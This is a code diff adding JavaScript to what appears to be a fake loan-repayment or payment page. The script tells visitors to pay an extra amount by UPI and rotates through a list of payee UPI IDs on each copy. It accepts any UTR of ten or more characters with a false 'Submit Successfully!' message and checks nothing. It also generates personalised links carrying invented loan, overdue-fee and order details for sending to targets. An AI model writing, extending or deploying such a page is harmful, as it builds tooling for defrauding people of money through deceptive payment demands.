+            document.getElementById('lblWarning').innerText = `Insufficient wallet balance, pay another ${MY_CONFIG.payableAmount} via UPI to complete your order`;
+            document.getElementById('lblUpiAmount').innerText = `-${MY_CONFIG.payableAmount}`;
+            
+            document.getElementById('lblStep3Payable').innerText = MY_CONFIG.payableAmount;
+            document.getElementById('lblTransferText').innerText = `transfer ${MY_CONFIG.payableAmount}`;
+            
+            updateUpiDisplay();
+        } else {
+            document.getElementById('step1Screen').style.display = 'none';
+            document.getElementById('generatorBox').style.display = 'block';
+        }
+    };
+
+    function openModal() {
+        document.getElementById('paymentModal').style.display = 'flex';
+    }
+    function closeModal(e) {
+        if(e.target.id === 'paymentModal') {
+            document.getElementById('paymentModal').style.display = 'none';
+        }
+    }
+    function goToStep3() {
+        document.getElementById('paymentModal').style.display = 'none';
+        document.getElementById('step1Screen').style.display = 'none';
+        document.getElementById('step3Screen').style.display = 'flex';
+        startUpiRotation();
+    }
+
+    function copyUpi() {
+        if(MY_CONFIG.upiList && MY_CONFIG.upiList.length > 0) {
+            var activeUpi = MY_CONFIG.upiList[currentUpiIndex];
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(activeUpi);
+            } else {
+                let textArea = document.createElement("textarea");
+                textArea.value = activeUpi;
+                textArea.style.position = "fixed";
+                textArea.style.left = "-999999px";
+                document.body.appendChild(textArea);
+                textArea.focus();
+                textArea.select();
+                try { document.execCommand('copy'); } catch (err) {}
+                document.body.removeChild(textArea);
+            }
+            alert('Copy UPI Successfully!');
+            currentUpiIndex = (currentUpiIndex + 1) % MY_CONFIG.upiList.length;
+            updateUpiDisplay();
+            startUpiRotation();
+        }
+    }
+
+    function submitUtr() {
+        var utr = document.getElementById('utrInput').value;
+        if(utr.length < 10) {
+            alert('Please enter a valid UTR number.');
+        } else {
+            alert('Submit Successfully!');
+        }
+    }
+
+    function generateLink() {
+        let mobile = encodeURIComponent(document.getElementById('genMobile').value);
+        let payable = encodeURIComponent(document.getElementById('genPayable').value);
+        let loanAmount = encodeURIComponent(document.getElementById('genLoanAmount').value);
+        let disbursed = encodeURIComponent(document.getElementById('genDisbursed').value);
+        let loanTerm = encodeURIComponent(document.getElementById('genLoanTerm').value);
+        let interest = encodeURIComponent(document.getElementById('genInterest').value);
+        let overdueFee = encodeURIComponent(document.getElementById('genOverdueFee').value);
+        let date = encodeURIComponent(document.getElementById('genDate').value);
+        let overdue = encodeURIComponent(document.getElementById('genOverdue').value);
+        let order = encodeURIComponent(document.getElementById('genOrder').value);
+
+        let baseUrl = window.location.origin + window.location.pathname;
+        let finalLink = `${baseUrl}?m=${mobile}&p=${payable}&la=${loanAmount}&d=${disbursed}&lt=${loanTerm}&int=${interest}&fee=${overdueFee}&date=${date}&o=${overdue}&id=${order}`;
+
+        let resBox = document.getElementById('resultLink');
+        resBox.style.display = 'block';
+        resBox.innerText = finalLink;
+
+        document.getElementById('copyBtn').style.display = 'block';
+    }
+
+    function copyGeneratedLink() {
+        let linkText = document.getElementById('resultLink').innerText;
+        navigator.clipboard.writeText(linkText);
+        alert('Link Copied Successfully!');
+    }
+</script>
 
 </body>
 </html>
